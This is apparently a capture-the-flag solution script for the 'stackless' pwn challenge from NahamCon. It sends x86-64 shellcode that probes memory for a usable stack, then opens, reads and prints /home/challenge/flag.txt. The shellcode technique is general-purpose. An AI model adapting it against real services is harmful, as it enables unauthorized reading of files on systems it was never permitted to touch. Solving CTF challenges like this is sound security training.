#!/usr/bin/env python3


from pwn import *
from sys import exit
from time import sleep
from timeit import default_timer


e = ELF("pwn/stackless/stackless")
#r = remote("127.0.0.1",9999)
r = remote("challenge.nahamcon.com",31700)
start = default_timer()
context.arch="amd64"
#r = process("pwn/stackless/stackless")
r.sendlineafter(b"length",f"{1000}")
shellcode = """
strikerr:
mov rdi,1
mov rsi,0x7ffe00000000
mov rdx,2
jmp syscaller
syscaller:
mov rax,1
syscall
cmp rax,1
jl increase
mov rax,0x3
mov rdi,0
syscall
add rsi,0x1000
mov rsp,rsi
movabs  r8,0x7478742e67616c66
push r8
movabs  r8,0x2f65676e656c6c61
push r8
movabs  r8,0x68632f656d6f682f
push r8
mov rdi,rsp
mov rax,2
mov rsi,0
mov rdx,0
syscall
mov r9,rax
mov rdi,r9
mov rsi,rsp
mov rdx,50
mov rax,0
syscall
mov rdi,1
mov rsi,rsp
mov rdx,50
mov rax,1
syscall
mov eax,60
syscall
increase:
add rsi,0x1000
jmp syscaller
"""
exploit = asm(shellcode)
#r.interactive()
r.sendlineafter(b"Shellcode\n",exploit)
r.interactive()

